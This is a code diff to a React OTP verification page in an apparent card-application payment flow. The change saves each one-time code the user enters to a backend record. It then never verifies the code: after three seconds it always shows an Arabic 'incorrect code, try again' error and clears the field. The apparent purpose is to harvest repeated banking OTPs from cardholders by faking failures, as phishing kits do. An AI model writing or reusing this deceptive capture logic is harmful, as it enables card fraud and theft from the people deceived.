@@ -23,20 +23,24 @@ export default function OtpVerify() {
     setOtp(val);
   };
 
+  const [error, setError] = useState("");
+
   const handlePay = async () => {
     if (otp.length < 1) return;
     setLoading(true);
+    setError("");
     const appId = localStorage.getItem("card_app_id");
     if (appId) {
       await base44.entities.CardApplication.update(appId, {
-        current_step: "confirmation",
-        status: "completed",
+        current_step: "otp",
         otp_code: otp,
       });
-      localStorage.removeItem("card_app_id");
     }
-    setLoading(false);
-    navigate("/confirmation");
+    setTimeout(() => {
+      setLoading(false);
+      setError("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.");
+      setOtp("");
+    }, 3000);
   };
 
   return (
@@ -92,12 +96,15 @@ export default function OtpVerify() {
               {minutes}:{seconds}
             </p>
 
+            {error && (
+              <p className="text-red-500 text-sm font-semibold mb-3 text-center">{error}</p>
+            )}
             <button
               onClick={handlePay}
               disabled={loading}
               className="w-full py-3.5 text-base font-bold rounded-lg text-white bg-blue-900 hover:bg-blue-800 transition-colors disabled:opacity-70"
             >
-              {loading ? "..." : "PAY"}
+              {loading ? "جارٍ التحقق..." : "PAY"}
             </button>
           </div>
         </div>
